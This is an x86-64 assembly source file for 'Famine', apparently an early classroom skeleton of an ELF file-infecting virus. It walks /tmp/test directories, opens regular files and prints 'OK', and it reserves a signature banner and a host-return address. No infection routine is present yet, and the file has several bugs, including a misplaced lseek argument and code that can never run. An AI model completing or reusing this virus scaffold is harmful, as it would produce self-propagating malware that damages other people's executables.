	[BITS 64]

	%define SYS_WRITE		1
	%define SYS_OPEN		2
	%define SYS_CLOSE		3
	%define SYS_LSEEK		8
	%define SYS_EXIT		60
	%define SYS_CHDIR		79
	%define SYS_GETDENTS64	217
	global famine64_func:function
	global famine64_size:data

	section .text
	famine64_size dd famine64_end - famine64_func

famine64_func:
	push 	rdi
	push 	rsi
	push 	rdx
	push 	rax
	push 	rbx
	sub		rsp, 8

	lea 	rdi, [rel dir_one]
	call 	find_files
	jmp		end
	lea 	rdi, [rel dir_two]
	call 	find_files
	jmp		end

;; void find_files(char *dir_path)
find_files:
	push 	rbp
	push	rbx
	sub		rsp, 1044			; char *dir_path, int fd   , int ret   , char buff[1024]
								; [rsp]         , [rsp + 8], [rsp + 12], [rsp + 16]

	xor		eax, eax
	mov		QWORD [rsp], rdi
	;; int	sys_open(rdi, 0, 0) 			-> ret: [rsp + 8] directory fd.
	mov		rdx, 0
	mov 	rsi, 0
	mov		rdi, QWORD [rsp]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0
	jl	 	find_files_end
	mov		DWORD [rsp + 8], eax
loop_file:
	xor		eax, eax
	;; int	sys_getdents(fd, *dirp, count)	-> ret: [rsp + 12]
	mov 	edi, DWORD [rsp + 8]
	lea 	rsi, [rsp + 16]
	mov 	rdx, 1024
	mov 	rax, SYS_GETDENTS64
	syscall
	test	eax, eax
	jle		loop_end
	mov		DWORD [rsp + 12], eax 				; store return value of getdents64
	xor		ebx, ebx							; initialize off to 0
	jmp		check_file
next_file:
	movsx	eax, BYTE [rsp + rbp + 32] 			; 32 = rsp + 16 + 16 (offset of *dirp->d_reclen)
	add		ebx, eax
	cmp		DWORD [rsp + 12], ebx
	jle		loop_file
check_file:	
	movsx	rbp, ebx
	cmp		BYTE [rsp + rbp + 34], 8 			; 34 = rsp + 16 + 18 (the offset of *dirp->d_type) + rbp (offset of each *dirp)
	jne		next_file
	mov		rdi, QWORD [rsp]
	lea		rsi, [rsp + rbp + 35] 				; 35 = rsp + 16 + 19 (offset of *dirp->d_name)
	call	get_dat_elf
	jmp		next_file
loop_end:
	mov		edi, DWORD [rsp + 8]
	mov		rax, SYS_CLOSE
	syscall
find_files_end:	
	add		rsp, 1044
	pop		rbx
	pop		rbp
	ret

;; void		get_dat_elf(char *dir, char *file)
get_dat_elf:
	push	rbp
	push	rbx
	sub		rsp, 1024			; char[1024], int fd
								; [rsp]     , [rsp + 8]

	xor		ecx, ecx			; store int i = 0 to do path[i] = dir[i]
	movzx	edx, BYTE [rdi]
	test	dl, dl
	je		next_copy
copy_dir:
	mov		BYTE [rsp + rcx], dl
	inc		rcx
	movzx	edx, BYTE [rdi + rcx]
	test	dl, dl
	jne		copy_dir
next_copy:
	add		rsp, rcx
	xor		eax, eax			; store j = 0 to do path[i + j] = file[j]
	movzx	edx, BYTE [rsi]
	test	dl, dl
	je		open_file
copy_file:	
	mov		BYTE [rsp + rax], dl
	inc		rax
	movzx	edx, BYTE [rsi + rax]
	test	dl, dl
	jne		copy_file
open_file:
	mov		BYTE [rsp + rax], 0
	sub		rsp, rcx
	;; int	sys_open(rdi, 0, 0) 			-> ret: [rsp + 1024] directory fd.
	mov		rdx, 0
	mov 	rsi, 0
	lea		rdi, [rsp]
	mov 	rax, SYS_OPEN
	syscall
	cmp 	rax, 0
	jl	 	get_dat_elf_end
	mov		QWORD [rsp], rax
	;; int	sys_leek(fd, 1, LSEEK_END)
	mov		rdi, rax
	mov		rsi, 1
	mov		rcx, 2							; LSEEK_END
	mov		rax, SYS_LSEEK
	syscall
	cmp		rax, 0
	jle		open_file_end
	call ret_ok

open_file_end:	
	mov		rdi, QWORD [rsp + 1024]
	mov		rax, SYS_CLOSE
	syscall
get_dat_elf_end:
	add		rsp, 1024
	pop		rbx
	pop		rbp
	ret

	;; // write(1, [rbp-1048] + [rbp-4], rax)
	mov 	rdx, rcx
	add		rdx, rax
	mov		rsi, rsp
	mov 	rdi, 1
	mov 	rax, SYS_WRITE
	syscall

	;; int strlen(char *)
strlen:
	mov 	rax, 0
	cmp 	rdi, byte 0
	je 		strlen_ret
	sub		rcx, rcx			; mise a 0 du compteur
	sub		al, al				; mise a 0 du char de comparaison
	not		rcx					; inverse le binaire (surement protect overflow)
	cld							; auto increment le ptr rcx et rdi a chaque appel
	repne	scasb				; repeat while [rdi] != al
	not		rcx					; restaure le compteur
	dec		rcx					; retire 1
	mov		rax, rcx			; ret value
strlen_ret:	
	ret

end:	
	pop 	rbx
	pop 	rax
	pop 	rdx
	pop 	rsi
	pop 	rdi
	add		rsp, 8

	mov 	rax, SYS_EXIT
	syscall
	push 	QWORD [rel jump_vaddr]
	ret

ret_ok:
	push rax
	push rdi
	push rsi
	push rdx
	mov 	rax, 1
	mov 	rdi, 1
	mov 	rsi, OK
	mov 	rdx, 3
	syscall
	pop rdx
	pop rsi
	pop rdi
	pop rax
	ret

ret_error:
	mov 	rax, 1
	mov 	rdi, 1
	mov 	rsi, ERR
	mov 	rdx, 6
	syscall
	ret

famine64_data:
	OK db "OK", 10
	ERR db "ERROR", 10
	banner db "Famine version 1.0 (c)oded by gbourgeo-xxxxxxxx"
	dir_one db "/tmp/test/", 0
	dir_two db "/tmp/test2/", 0
	jump_vaddr dq 0x0

famine64_end:
